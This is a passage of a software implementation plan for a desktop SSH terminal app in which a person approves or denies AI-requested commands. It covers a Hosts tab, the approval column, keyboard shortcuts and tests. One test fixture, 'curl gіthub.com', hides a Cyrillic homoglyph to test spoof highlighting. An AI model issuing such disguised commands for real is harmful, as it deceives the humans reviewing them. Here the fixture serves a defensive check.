                <button type="button" className="icon" aria-label={`Delete ${s.name}`} title="Delete" onClick={() => onDelete(s.name)}><TrashIcon /></button>
              </span>
            </li>
          ))}
        </ul>
      )}
      <footer className="muted">Vault file: <code>{storePath}</code> — copy it to back up.</footer>
    </nav>
  )
}
```

- [ ] **Step 6: Rewrite the render of `TerminalTabs.tsx`**

Add imports: `import type { ReactNode } from 'react'`, `import type { ServerInfo } from '../shared/protocol'`, `import { HomeIcon, CloseIcon } from './icons'`. Extend the props type to:

```ts
  theme: Theme; hostKeys: HostKeyPrompts; onMismatch: (m: HostKeyMismatch) => void; onTrusted: () => void
  home: ReactNode; actions: ReactNode; banner: ReactNode; servers: ServerInfo[]
```

and destructure them. Replace the returned JSX with:

```tsx
  const home = tabs.active === undefined
  const target = (server: string) => {
    const s = servers.find((x) => x.name === server)
    return s ? `${s.user}@${s.host}:${s.port}` : server
  }
  return (
    <div className="terms">
      <div className="tabbar">
        <button type="button" className={'hometab' + (home ? ' active' : '')} onClick={() => { tabs.showHome(); changed() }}>
          <HomeIcon />Hosts
        </button>
        {tabs.tabs.map((t) => (
          <div key={t.id} className={'tab' + (t.id === tabs.active ? ' active' : '') + (t.state === 'exited' ? ' exited' : '')} title={target(t.server)}>
            <button type="button" className="tabname" onClick={() => { tabs.activate(t.id); changed() }}>
              <span className="dot" aria-hidden="true" />{t.server}{t.state === 'exited' ? ' · exited' : ''}
            </button>
            {t.state === 'exited' && (
              <button type="button" className="reconnect" onClick={() => { tabs.close(t.id); tabs.open(t.server); changed() }}>Reconnect</button>
            )}
            <button type="button" className="icon tabclose" title="Close" aria-label="Close" onClick={() => { tabs.close(t.id); changed() }}><CloseIcon /></button>
          </div>
        ))}
        <div className="tabbar-actions">{actions}</div>
      </div>
      {banner}
      <div className="termarea">
        <div className="homeview" style={{ display: home ? 'block' : 'none' }}>{homeContent}</div>
        {tabs.tabs.map((t) => (
          <TermView key={t.id} tab={t} tabs={tabs} events={events} visible={t.id === tabs.active} onChange={changed} register={register}
            theme={theme} hostKeys={hostKeys} onMismatch={onMismatch} onTrusted={onTrusted} />
        ))}
      </div>
    </div>
  )
```

(Destructure the `home` prop as `home: homeContent` to avoid the name clash with the local `home` boolean.)

- [ ] **Step 7: Restructure the ready layout in `App.tsx`**

Remove the `<header>`, the `HostList` and the `StoreErrorBanner` from the `ready` branch, and render the shell instead. The return becomes:

```tsx
  const lock = async () => { try { await hub.lock(); setUnlockError(undefined); await refresh() } catch { /* the locked/hub-state events recover the UI */ } }
  const actions = (
    <>
      <ThemeControl pref={themePref} onChange={chooseTheme} />
      <button type="button" className="btn" onClick={lock}><LockIcon />Lock</button>
    </>
  )
  const hostList = (
    <HostList servers={servers} storePath={status?.storePath ?? ''} onOpen={(name) => terms.current?.open(name)}
      onNew={() => setEditing({})}
      onEdit={async (name) => { await reloadServers(); setEditing({ name }) }}
      onDelete={deleteHost} />
  )

  // Once shown, the shell (tabs, terminals) stays mounted, hidden and inert, through
  // lock and hub restarts, so SSH sessions survive a lock and a restart can end them
  // with Reconnect.
  return (
    <div className="app">
      {!ready && (screen.kind === 'hub' ? (
        <HubScreen state={screen.state} />
      ) : screen.kind === 'create-vault' ? (
        <div className="center"><CreateVault servers={servers} onCreate={createVault} /></div>
      ) : (
        <div className="center">
          {idleLocked && <p className="muted">Locked after inactivity.</p>}
          <Unlock onUnlock={unlock} error={screen.error} />
        </div>
      ))}
      {(ready || everReady) && (
        <div className="shell" style={ready ? undefined : { display: 'none' }} inert={!ready}>
          <main className="work">
            <Terminals ref={terms} theme={theme} hostKeys={hostKeys} onMismatch={setMismatch} onTrusted={reloadServers}
              home={hostList} actions={actions} banner={<StoreErrorBanner message={status?.storeError} />} servers={servers} />
          </main>
          {ready && (
            <ApprovalPanel items={items} seedError={seedError}
              onDecide={(id, outcome, reason) => hub.decide(id, outcome, reason)}
              onDenyAll={() => hub.denyAll('denied all by user')}
              onSendToTab={async (item) => {
                await terms.current!.sendToTab(item.request.server, item.request.command)
                await hub.decide(item.request.id, 'sent_to_tab')
              }} />
          )}
        </div>
      )}
      {ready && editing && (
        /* unchanged HostEditor element */
      )}
      {ready && <HostKeyDialog prompts={hostKeys} />}
      {ready && mismatch && (
        /* unchanged HostKeyMismatchDialog element */
      )}
    </div>
  )
```

Keep the `HostEditor` and `HostKeyMismatchDialog` elements exactly as they are today (copy them into the two marked places). Add `import { LockIcon } from './icons'`. `HostList` is now rendered inside `Terminals`, so its import stays.

- [ ] **Step 8: Replace the `layout`, `hosts` and `tabs` sections of `styles.css`**

```css
/* == layout == */
.app { height: 100%; }
.center { height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 8px; }
.shell { height: 100%; display: grid; grid-template-columns: minmax(0, 1fr) auto; }
.work { min-width: 0; overflow: hidden; }
.store-error { padding: 10px 16px; background: var(--danger-tint); color: var(--danger); border-bottom: 1px solid var(--divider); }
.stderr { max-width: 80%; max-height: 50%; overflow: auto; background: var(--term-bg); padding: 8px; }

/* == hosts == */
.homeview { position: absolute; inset: 0; overflow: auto; background: var(--bg); }
.hosts { padding: 20px 24px; display: flex; flex-direction: column; gap: 12px; min-height: 100%; }
.hosts-head { display: flex; gap: 8px; max-width: 720px; }
.hosts-head input { flex: 1; }
.section-label { font-size: 11px; font-weight: 600; letter-spacing: 0.08em; text-transform: uppercase; color: var(--muted); }
.hostgrid { list-style: none; margin: 0; padding: 0; display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 12px; }
.hostcard { position: relative; display: flex; background: var(--surface); border: 1px solid var(--divider); border-radius: 8px; }
.hostcard:hover, .hostcard:focus-within { border-color: var(--line); }
.hostcard-open { flex: 1; min-width: 0; display: flex; gap: 12px; align-items: center; padding: 12px; background: none; border: 0; text-align: left; border-radius: 8px; }
.tile { width: 36px; height: 36px; flex: none; border-radius: 8px; display: grid; place-items: center; background: var(--accent-tint); color: var(--accent); font-weight: 600; font-size: 15px; }
.hostcard-text { min-width: 0; display: flex; flex-direction: column; gap: 2px; }
.hostcard-name { font-weight: 600; font-size: 14px; display: flex; align-items: center; gap: 6px; }
.hostcard-addr { color: var(--muted); font-size: 12px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.hostcard-actions { display: flex; align-items: center; gap: 2px; padding-right: 8px; opacity: 0; }
.hostcard:hover .hostcard-actions, .hostcard:focus-within .hostcard-actions { opacity: 1; }
.empty { color: var(--muted); padding: 24px 0; }
.hosts footer { margin-top: auto; padding-top: 12px; word-break: break-all; }

/* == tabs == */
.terms { height: 100%; display: flex; flex-direction: column; }
.tabbar { height: 40px; flex: none; display: flex; align-items: flex-end; gap: 2px; padding: 0 8px; background: var(--surface); border-bottom: 1px solid var(--divider); overflow-x: auto; }
.hometab, .tab { height: 32px; display: flex; align-items: center; gap: 6px; border-radius: 8px 8px 0 0; color: var(--muted); }
.hometab { padding: 0 12px; background: none; border: 0; font-weight: 500; }
.hometab.active, .tab.active { background: var(--bg); color: var(--text); }
.tab.active { background: var(--term-bg); }
.tab { padding-left: 4px; }
.tab .tabname { height: 100%; display: flex; align-items: center; gap: 8px; padding: 0 6px 0 8px; background: none; border: 0; color: inherit; font-weight: 500; white-space: nowrap; }
.tab .dot { width: 7px; height: 7px; border-radius: 50%; background: var(--ok); }
.tab.exited .dot { background: transparent; box-shadow: inset 0 0 0 1.5px var(--muted); }
.tab .reconnect { background: var(--accent-tint); color: var(--accent); border: 0; border-radius: 4px; padding: 2px 6px; font-size: 12px; font-weight: 600; }
.tab .tabclose { width: 22px; height: 22px; }
.tabbar-actions { margin-left: auto; align-self: center; display: flex; align-items: center; gap: 8px; padding-left: 12px; }
.termarea { flex: 1; min-height: 0; position: relative; background: var(--term-bg); }
.term { position: absolute; inset: 0; padding: 6px 10px; }
```

- [ ] **Step 9: Update the e2e helpers and specs**

In `desktop/e2e/launch.ts`, change `openBox` so it works while a terminal is active:

```ts
export async function openBox(win: Page): Promise<void> {
  await win.locator('.tabbar .hometab').click()
  await win.locator('nav.hosts').getByRole('button', { name: 'box', exact: true }).click()
  await win.locator('.xterm').click()
}
```

In `desktop/e2e/hosts.spec.ts`:
- add after the `const editor ...` lines: `const home = () => win.locator('.tabbar .hometab').click()`
- change `const openBox = () => hosts.getByRole(...).click()` to `const openBox = async () => { await home(); await hosts.getByRole('button', { name: 'box', exact: true }).click() }`
- change `const editBox = () => hosts.getByRole(...).click()` to `const editBox = async () => { await home(); await hosts.getByRole('button', { name: 'Edit box' }).click() }`
- change both `toContainText('(exited)')` to `toContainText('exited')`.

Append to `desktop/e2e/ui.spec.ts`:

```ts
test('Hosts is the home tab, search filters the cards, closing the last tab returns home', async () => {
  const hosts = win.locator('nav.hosts')
  await expect(hosts).toBeVisible()
  const search = hosts.getByRole('searchbox', { name: 'Search hosts' })
  await search.fill('nomatch')
  await expect(hosts).toContainText('No hosts match "nomatch"')
  await search.fill('BO')
  await expect(hosts.getByRole('button', { name: 'box', exact: true })).toBeVisible()
  await search.fill('')
  await hosts.getByRole('button', { name: 'box', exact: true }).click()
  await expect(win.locator('.xterm')).toBeVisible()
  await expect(hosts).toBeHidden()
  await win.locator('.tabbar .tab').first().getByRole('button', { name: 'Close' }).click()
  await expect(hosts).toBeVisible()
})
```

- [ ] **Step 10: Run all checks**

Run: `npm run typecheck && npm test && npm run build && npx playwright test`
Expected: all unit tests and all e2e specs pass (smoke, idle, throughput, clipboard, hosts, keyboard, ui).

- [ ] **Step 11: Commit**

```bash
git add -A desktop/src/renderer desktop/test desktop/e2e
git commit -m "feat(desktop): Hosts home tab with a searchable card grid

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01ALpoGjeMRZDpNY1DS7YHx2"
```

---

### Task 3: Docked AI requests column and its safety rules

**Files:**
- Modify: `desktop/src/renderer/approvals.ts`, `desktop/src/renderer/ApprovalPanel.tsx`, `desktop/src/renderer/App.tsx`, `desktop/src/renderer/styles.css` (section `approvals`), `desktop/e2e/keyboard.spec.ts`, `desktop/e2e/ui.spec.ts`
- Test: `desktop/test/approvals.test.ts`, `desktop/test/ApprovalPanel.test.ts`

**Interfaces:**
- Consumes: `.shell` grid and `actions` slot (Task 2).
- Produces: `ListChanges.touch(now: number): void`; `ApprovalPanel` prop `onClose: () => void`; `Item` disables Send to tab with Allow; App state `aiOpen: boolean` and `setAiOpen`; the AI button `aria-label="AI requests"` with class `aibtn` (`waiting` when collapsed with items).

- [ ] **Step 1: Write failing unit tests**

Append to `desktop/test/approvals.test.ts` (add `ListChanges` to the import if absent):

```ts
describe('ListChanges.touch', () => {
  it('records a change at the given time (scrolling moves items under the cursor)', () => {
    const c = new ListChanges('a', 0)
    c.touch(700)
    expect(c.at).toBe(700)
  })
})
```

In `desktop/test/ApprovalPanel.test.ts`, add:

```ts
  it('keeps Allow and Send to tab disabled while the item is young, and never autofocuses', () => {
    const [item] = seed([req], 0)
    const html = renderToStaticMarkup(createElement(Item, { item, now: 100, onDecide: async () => {}, onSendToTab: async () => {} }))
    const buttons = [...html.matchAll(/<button([^>]*)>(.*?)<\/button>/g)].map((m) => ({ attrs: m[1], text: m[2].replace(/<[^>]+>/g, '') }))
    expect(buttons.find((b) => b.text === 'Allow')!.attrs).toMatch(/disabled=""/)
    expect(buttons.find((b) => b.text === 'Send to tab')!.attrs).toMatch(/disabled=""/)
    expect(html).not.toMatch(/autofocus/i)
  })
```

- [ ] **Step 2: Run to verify failure**

Run: `npx vitest run test/approvals.test.ts test/ApprovalPanel.test.ts`
Expected: FAIL (`touch` is not a function; Send to tab not disabled).

- [ ] **Step 3: Implement `touch`** in `approvals.ts`, inside `class ListChanges` after `setHeight`:

```ts
  // Something moved the items without changing ids or height (scrolling the list).
  touch(now: number): void { this.at = now }
```

- [ ] **Step 4: Update `ApprovalPanel.tsx`**

Import `CloseIcon` from `./icons`. Change the `ApprovalPanel` props to add `onClose: () => void`. Replace its returned JSX with:

```tsx
  const scrolled = () => { changes.current!.touch(Date.now()); setNow(Date.now()) }
  return (
    <aside className="approvals" aria-label="Approval requests">
      <div className="approvals-head">
        <h3>AI requests {items.length > 0 && <span className="count">{items.length}</span>}</h3>
        {/* Always rendered so the list never shifts when it appears or disappears. */}
        <button type="button" className="btn danger-outline denyall" onClick={denyAll} disabled={items.length < 2}>Deny all</button>
        <button type="button" className="icon" aria-label="Close AI requests" title="Close" onClick={onClose}><CloseIcon /></button>
      </div>
      <p className="approvals-help">Every command waits for you. Enter in a request denies; Allow takes a mouse click.</p>
      {/* Scrolling moves a different Allow under a still cursor: it restarts the delay. */}
      <div className="approvals-scroll" onScroll={scrolled}>
        {/* Observed for height changes: anything that shifts the items lives in here. */}
        <div ref={listRef}>
          {denyAllError && <p className="error">{denyAllError}</p>}
          {items.length === 0 && (
            seedError
              ? <p className="error">Could not load pending requests: {seedError}</p>
              : <p className="muted empty">Nothing waiting.</p>
          )}
          {items.map((item) => (
            <Item key={item.request.id} item={item} now={now} changedAt={changedAt}
              onDecide={onDecide} onSendToTab={onSendToTab} />
          ))}
        </div>
      </div>
    </aside>
  )
```

In `Item`, give Send to tab the same delay as Allow; replace its `disabled={busy}` with:

```tsx
          disabled={busy || !allowEnabled(item, now, changedAt)}
```

- [ ] **Step 5: Column state in `App.tsx`**

Add state and the seen-id set near the other approval state:

```ts
  const [aiOpen, setAiOpen] = useState(false)
  const seenIds = useRef(new Set<string>())
```

In the existing approval `hub.onEvent` effect, after the `pendingSince.current.add(...)` branch logic, open the column for an id not seen before (collapsing is the user's; a new request reopens it):

```ts
    if (e.method === 'pending' && !seenIds.current.has(e.params.request.id)) {
      seenIds.current.add(e.params.request.id)
      setAiOpen(true)
    }
```

In the seed effect's `.then`, after `setItems(...)`, open it when requests are already waiting:

```ts
          if (p.length > 0) { for (const r of p) seenIds.current.add(r.id); setAiOpen(true) }
```

Add the AI button to `actions`, before `ThemeControl`:

```tsx
      {(aiOpen || items.length > 0) && (
        <button type="button" className={'btn aibtn' + (!aiOpen && items.length > 0 ? ' waiting' : '')}
          aria-label="AI requests" aria-expanded={aiOpen} onClick={() => setAiOpen((o) => !o)}>
          AI <span className="count">{items.length}</span>
        </button>
      )}
```

Mount the panel only while open (its mount restarts the Allow delay): change `{ready && (<ApprovalPanel ...` to `{ready && aiOpen && (<ApprovalPanel ...` and pass `onClose={() => setAiOpen(false)}`.

- [ ] **Step 6: Replace the `approvals` section of `styles.css`**

```css
/* == approvals == */
.approvals { width: 380px; min-height: 0; display: flex; flex-direction: column; background: var(--surface); border-left: 1px solid var(--divider); }
.approvals-head { display: flex; align-items: center; gap: 8px; padding: 14px 16px 4px; }
.approvals-head h3 { flex: 1; font-size: 15px; font-weight: 600; display: flex; align-items: center; gap: 8px; }
.count { min-width: 20px; height: 20px; padding: 0 6px; border-radius: 10px; display: inline-grid; place-items: center; background: var(--wait); color: #1A1407; font-size: 12px; font-weight: 600; }
.approvals-help { padding: 0 16px 12px; color: var(--muted); font-size: 12px; border-bottom: 1px solid var(--divider); }
.approvals-scroll { flex: 1; min-height: 0; overflow: auto; padding: 4px 12px 12px; }
.approvals .empty { padding: 24px 4px; }
.approval { border: 1px solid var(--line); border-left: 3px solid var(--wait); border-radius: 8px; padding: 10px 12px; margin: 8px 0; display: flex; flex-direction: column; gap: 6px; background: var(--raised); }
.approval.sudo { border-left-color: var(--danger); }
.cmd { white-space: pre-wrap; word-break: break-all; background: var(--term-bg); color: var(--term-fg); padding: 8px 10px; margin: 0; border-radius: 6px; }
.cmd mark { background: var(--wait); color: #1A1407; unicode-bidi: isolate; }
.desc { font-size: 12px; color: var(--label); }
.actions { display: flex; gap: 6px; }
.actions .deny { background: var(--danger-fill); color: #fff; border: 0; }
.actions .allow { background: transparent; color: var(--ok); border: 1px solid var(--ok); }
.aibtn .count { margin-left: 2px; }
.aibtn.waiting { border-color: var(--wait); color: var(--wait); animation: pulse 1.6s ease-in-out infinite; }
@keyframes pulse { 50% { box-shadow: 0 0 0 3px var(--wait-tint); } }
```

- [ ] **Step 7: Update `desktop/e2e/keyboard.spec.ts`**

The column adds its close button to the tab stops. In the stop-recording `evaluate`, record buttons by accessible label:

```ts
      if (!a?.closest('.approvals')) return null
      return a.tagName === 'INPUT' ? 'reason' : (a.getAttribute('aria-label') ?? a.textContent ?? '').replace('↵', '').trim()
```

and change the expectation to:

```ts
  expect([...stops].sort()).toEqual(['Close AI requests', 'Deny', 'reason'])
```

- [ ] **Step 8: Append the column tests to `desktop/e2e/ui.spec.ts`**

Add `import { doorCall } from './doorClient'` to the imports, then:

```ts
const exec = (id: string) => doorCall(l.socket, 'exec', { requestId: id, client: 'e2e', server: 'box', command: `echo ${id}`, description: '' })
// Resolves true once p settles either way, false after ms; never leaks a rejection.
const settledWithin = (p: Promise<unknown>, ms: number) =>
  Promise.race([p.then(() => true, () => true), new Promise<boolean>((r) => setTimeout(() => r(false), ms))])

test('the AI column opens itself; collapsing keeps the request; reopening restarts the delays', async () => {
  const column = win.locator('.approvals')
  const req = exec('c1')
  await expect(column).toBeVisible()
  await expect(column.getByRole('button', { name: 'Allow' })).toBeEnabled({ timeout: 2000 })

  await column.getByRole('button', { name: 'Close AI requests' }).click()
  await expect(column).toBeHidden()
  const aiButton = win.getByRole('button', { name: 'AI requests' })
  await expect(aiButton).toHaveClass(/waiting/)
  expect(await settledWithin(req, 500)).toBe(false)

  await aiButton.click()
  // Sampled in-page on the frame the column appears, so a slow poll cannot miss it.
  const fresh = await win.waitForFunction(() => {
    const allow = document.querySelector('.approvals button.allow') as HTMLButtonElement | null
    const send = [...document.querySelectorAll('.approvals .approval button')].find((b) => b.textContent === 'Send to tab') as HTMLButtonElement | undefined
    return allow && send ? { allow: allow.disabled, send: send.disabled } : null
  }, undefined, { polling: 'raf' })
  expect(await fresh.jsonValue()).toEqual({ allow: true, send: true })

  const denied = expect(req).rejects.toThrow('Denied by user')
  await column.getByRole('button', { name: 'Deny', exact: true }).click()
  await denied
})

test('scrolling the request list disables Allow again', async () => {
  const reqs = ['s1', 's2', 's3', 's4', 's5'].map(exec)
  for (const r of reqs) r.catch(() => {}) // denied below
  const column = win.locator('.approvals')
  await expect(column.locator('.approval')).toHaveCount(5)
  await expect(column.locator('button.allow').first()).toBeEnabled({ timeout: 2000 })
  const afterScroll = await win.evaluate(async () => {
    const list = document.querySelector('.approvals-scroll')!
    if (list.scrollHeight <= list.clientHeight) return 'not scrollable'
    list.scrollTop += 120
    await new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(r)))
    return [...document.querySelectorAll('.approvals button.allow')].every((b) => (b as HTMLButtonElement).disabled)
  })
  expect(afterScroll).toBe(true)
  await column.getByRole('button', { name: 'Deny all' }).click()
  await expect(column.locator('.approval')).toHaveCount(0)
})
```

- [ ] **Step 9: Run all checks**

Run: `npm run typecheck && npm test && npm run build && npx playwright test`
Expected: all pass. `smoke.spec.ts` needs no change: the column opens itself when its request arrives and stays open showing `Nothing waiting.`.

- [ ] **Step 10: Commit**

```bash
git add desktop/src/renderer/approvals.ts desktop/src/renderer/ApprovalPanel.tsx desktop/src/renderer/App.tsx desktop/src/renderer/styles.css desktop/test/approvals.test.ts desktop/test/ApprovalPanel.test.ts desktop/e2e/keyboard.spec.ts desktop/e2e/ui.spec.ts
git commit -m "feat(desktop): docked AI requests column; Send to tab and scroll restart the delay

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01ALpoGjeMRZDpNY1DS7YHx2"
```

---

### Task 4: Approval card content

**Files:**
- Modify: `desktop/src/renderer/approvals.ts`, `desktop/src/renderer/ApprovalPanel.tsx` (the `Item` component), `desktop/src/renderer/styles.css` (append to section `approvals`)
- Test: `desktop/test/approvals.test.ts`, `desktop/test/ApprovalPanel.test.ts`

**Interfaces:**
- Consumes: `Item` from Task 3 (delay rules unchanged).
- Produces: `nonAsciiSummary(s: string): string | undefined`; `isNonAscii(cp: number): boolean` (shared with `highlightNonAscii`).

- [ ] **Step 1: Write failing unit tests**

Append to `desktop/test/approvals.test.ts` (import `nonAsciiSummary`):

```ts
describe('nonAsciiSummary', () => {
  it('is undefined for plain ASCII', () => {
    expect(nonAsciiSummary('ls -la /tmp')).toBeUndefined()
  })
  it('counts every non-ASCII character and lists distinct code points', () => {
    expect(nonAsciiSummary('curl gіthub.com')).toBe('1 non-ASCII character highlighted (U+0456)')
    expect(nonAsciiSummary('іі')).toBe('2 non-ASCII characters highlighted (U+0456)')
  })
  it('lists at most five code points', () => {
    expect(nonAsciiSummary('àáâãäå')).toBe('6 non-ASCII characters highlighted (U+00E0, U+00E1, U+00E2, U+00E3, U+00E4, +1 more)')
  })
})
```

In `desktop/test/ApprovalPanel.test.ts`, update the first test's button parsing so tags inside a button do not break it, and assert the new card content. Replace the `const buttons = ...` line in the first test with:

```ts
    const buttons = [...html.matchAll(/<button([^>]*)>(.*?)<\/button>/g)]
      .map((m) => ({ attrs: m[1], text: m[2].replace(/<kbd[^>]*>.*?<\/kbd>/g, '').replace(/<[^>]+>/g, '') }))
```

and add a test:

```ts
  it('labels the reason field, hides the Enter hint from the name, and flags sudo in red', () => {
    const [item] = seed([{ ...req, sudo: true, command: 'rm gіt', description: 'cleanup' }], 0)
    const html = renderToStaticMarkup(createElement(Item, { item, now: 10_000, onDecide: async () => {}, onSendToTab: async () => {} }))
    expect(html).toMatch(/<label[^>]*>Reason \(optional\)/)
    expect(html).toContain('placeholder="Reason (optional)"')
    expect(html).toMatch(/<kbd aria-hidden="true">↵<\/kbd>/)
    expect(html).toContain('class="approval sudo"')
    expect(html).toContain('1 non-ASCII character highlighted (U+0456)')
    expect(html).toContain('AI&#x27;s description · unverified')
    expect(html).toContain('client claude-code (unverified)')
  })
```

- [ ] **Step 2: Run to verify failure**

Run: `npx vitest run test/approvals.test.ts test/ApprovalPanel.test.ts`
Expected: FAIL (`nonAsciiSummary` not exported; markup lacks the label).

- [ ] **Step 3: Implement in `approvals.ts`**

Replace the predicate inside `highlightNonAscii` with a shared helper and add the summary:

```ts
export const isNonAscii = (cp: number) => cp > 0x7e || cp < 0x20

export function highlightNonAscii(s: string): Segment[] {
  const out: Segment[] = []
  for (const ch of s) {
    const nonAscii = isNonAscii(ch.codePointAt(0)!)
    const last = out[out.length - 1]
    if (last && last.nonAscii === nonAscii) last.text += ch
    else out.push({ text: ch, nonAscii })
  }
  return out
}

// "N non-ASCII characters highlighted (U+0456, …)": the code points make a
// homoglyph (Cyrillic і in "gіthub") visible even where the glyphs look identical.
export function nonAsciiSummary(s: string): string | undefined {
  const cps: number[] = []
  let n = 0
  for (const ch of s) {
    const cp = ch.codePointAt(0)!
    if (!isNonAscii(cp)) continue
    n++
    if (!cps.includes(cp)) cps.push(cp)
  }
  if (n === 0) return undefined
  const shown = cps.slice(0, 5).map((cp) => 'U+' + cp.toString(16).toUpperCase().padStart(4, '0'))
  if (cps.length > 5) shown.push(`+${cps.length - 5} more`)
  return `${n} non-ASCII character${n === 1 ? '' : 's'} highlighted (${shown.join(', ')})`
}
```

- [ ] **Step 4: Rewrite the `Item` render in `ApprovalPanel.tsx`**

Add imports `nonAsciiSummary` (from `./approvals`) and `WarningIcon` (from `./icons`). Replace `Item`'s returned JSX with:

```tsx
  const summary = nonAsciiSummary(r.command)
  const received = r.receivedAt ? new Date(r.receivedAt).toLocaleTimeString() : ''
  return (
    <form className={'approval' + (r.sudo ? ' sudo' : '')} onSubmit={deny}>
      <div className="who">
        <strong>{r.server}</strong>
        {r.sudo && <span className="chip danger">SUDO</span>}
        <span className="when mono">{received}</span>
      </div>
      {/* The endpoint this approval is bound to; the hub refuses the run if it changes. */}
      <div className="target mono">{r.target}</div>
      <pre className="cmd">
        {highlightNonAscii(r.command).map((s, i) => (s.nonAscii ? <mark key={i}>{s.text}</mark> : <span key={i}>{s.text}</span>))}
      </pre>
      {summary && <p className="nonascii"><WarningIcon />{summary}</p>}
      {r.description && (
        <div className="desc"><span className="desc-label">AI&apos;s description · unverified</span>{r.description}</div>
      )}
      <div className="meta">{`timeout ${r.timeoutSec}s · client ${r.client} (unverified)`}</div>
      <label className="reason">Reason (optional)
        <input placeholder="Reason (optional)" value={reason} onChange={(e) => setReason(e.target.value)} />
      </label>
      <div className="actions">
        <button type="submit" className="btn deny" disabled={busy}>Deny<kbd aria-hidden="true">↵</kbd></button>
        {/* Between Deny and Allow, so a click that misses Deny does not land on Allow. */}
        <button type="button" className="btn" tabIndex={-1} onKeyDown={blockKeyboardActivation}
          disabled={busy || !allowEnabled(item, now, changedAt)}
          onClick={() => { if (!busy) act(onSendToTab(item)) }}>Send to tab</button>
        <button type="button" className="btn allow" tabIndex={-1} onKeyDown={blockKeyboardActivation}
          disabled={busy || !allowEnabled(item, now, changedAt)}
          onClick={() => { if (!busy) act(onDecide(r.id, 'allowed', '')) }}>Allow</button>
      </div>
      {error && <p className="error">{error}</p>}
    </form>
  )
```

- [ ] **Step 5: Append to the `approvals` section of `styles.css`**

```css
.approval .who { display: flex; align-items: center; gap: 8px; }
.approval .who strong { font-size: 14px; }
.approval .when { margin-left: auto; color: var(--muted); font-size: 12px; font-variant-numeric: tabular-nums; }
.approval .target { color: var(--muted); font-size: 12px; margin-top: -4px; }
.nonascii { display: flex; align-items: center; gap: 6px; color: var(--wait); font-size: 12px; }
.desc { display: flex; flex-direction: column; gap: 2px; background: var(--bg); border-radius: 6px; padding: 8px 10px; }
.desc-label { font-size: 10px; font-weight: 600; letter-spacing: 0.06em; text-transform: uppercase; color: var(--muted); }
.approval .meta { color: var(--muted); font-size: 12px; }
.approval .reason { display: flex; flex-direction: column; gap: 4px; font-size: 12px; color: var(--label); }
.actions { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }
.actions .btn { height: 36px; }
.actions .deny kbd { margin-left: 6px; }
```

- [ ] **Step 6: Run all checks**

Run: `npm run typecheck && npm test && npm run build && npx playwright test e2e/smoke.spec.ts e2e/keyboard.spec.ts e2e/ui.spec.ts e2e/idle.spec.ts`
Expected: all pass (`Deny` still matches exactly: the `↵` is `aria-hidden`).

- [ ] **Step 7: Commit**

```bash
git add desktop/src/renderer/approvals.ts desktop/src/renderer/ApprovalPanel.tsx desktop/src/renderer/styles.css desktop/test/approvals.test.ts desktop/test/ApprovalPanel.test.ts
git commit -m "feat(desktop): approval card shows target, code points, labelled reason

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01ALpoGjeMRZDpNY1DS7YHx2"
```

---

### Task 5: Keyboard path from a terminal to the approvals

**Files:**
- Modify: `desktop/src/renderer/terminals.ts`, `desktop/src/renderer/TermView.tsx`, `desktop/src/renderer/TerminalTabs.tsx`, `desktop/src/renderer/ApprovalPanel.tsx`, `desktop/src/renderer/App.tsx`, `desktop/e2e/keyboard.spec.ts`
- Test: `desktop/test/terminals.test.ts`

**Interfaces:**
- Consumes: `aiOpen`/`setAiOpen` (Task 3); `Item`'s reason input (Task 4).
- Produces: `approvalsKey(e: { type: string; key: string; ctrlKey: boolean; shiftKey: boolean; altKey: boolean; metaKey: boolean }, platform: string): boolean`; `TermApi.focus(): void`; `TerminalsHandle.focusActive(): void`; `Terminals`/`TermView` prop `onFocusApprovals: () => void`; `ApprovalPanel`/`Item` prop `onEscape: () => void`.

- [ ] **Step 1: Write the failing unit test**

Append to `desktop/test/terminals.test.ts` (import `approvalsKey`):

```ts
describe('approvalsKey', () => {
  const k = (o: Partial<{ type: string; key: string; ctrlKey: boolean; shiftKey: boolean; altKey: boolean; metaKey: boolean }>) =>
    ({ type: 'keydown', key: 'A', ctrlKey: false, shiftKey: true, altKey: false, metaKey: false, ...o })
  it('is Ctrl+Shift+A off macOS and Cmd+Shift+A on macOS', () => {
    expect(approvalsKey(k({ ctrlKey: true }), 'Linux x86_64')).toBe(true)
    expect(approvalsKey(k({ ctrlKey: true, key: 'a' }), 'Win32')).toBe(true)
    expect(approvalsKey(k({ metaKey: true }), 'MacIntel')).toBe(true)
  })
  it('ignores other keys, missing Shift, extra modifiers, and the other platform binding', () => {
    expect(approvalsKey(k({ ctrlKey: true, shiftKey: false }), 'Linux x86_64')).toBe(false)
    expect(approvalsKey(k({ ctrlKey: true, altKey: true }), 'Linux x86_64')).toBe(false)
    expect(approvalsKey(k({ ctrlKey: true, key: 'C' }), 'Linux x86_64')).toBe(false)
    expect(approvalsKey(k({ ctrlKey: true }), 'MacIntel')).toBe(false)
    expect(approvalsKey(k({ metaKey: true }), 'Linux x86_64')).toBe(false)
  })
})
```

- [ ] **Step 2: Run to verify failure**

Run: `npx vitest run test/terminals.test.ts`
Expected: FAIL (`approvalsKey` not exported).

- [ ] **Step 3: Implement `approvalsKey`** in `terminals.ts` (after `clipboardKey`):

```ts
// Ctrl+Shift+A (Cmd+Shift+A on macOS) jumps from a terminal to the oldest AI
// request: xterm keeps Tab, so without it the keyboard cannot reach Deny.
export function approvalsKey(
  e: { type: string; key: string; ctrlKey: boolean; shiftKey: boolean; altKey: boolean; metaKey: boolean },
  platform: string,
): boolean {
  const mac = platform.startsWith('Mac')
  const mod = mac ? e.metaKey && !e.ctrlKey : e.ctrlKey && !e.metaKey
  return mod && e.shiftKey && !e.altKey && e.key.toLowerCase() === 'a'
}
```

- [ ] **Step 4: Run the unit test**

Run: `npx vitest run test/terminals.test.ts`
Expected: PASS.

- [ ] **Step 5: Wire it through the components**

`TermView.tsx`: import `approvalsKey`; add prop `onFocusApprovals: () => void`; extend `TermApi` to `export interface TermApi { paste(text: string): void; focus(): void }`; register `{ paste: (text) => term.paste(text), focus: () => term.focus() }`; replace the custom key handler with:

```ts
    term.attachCustomKeyEventHandler((e) => {
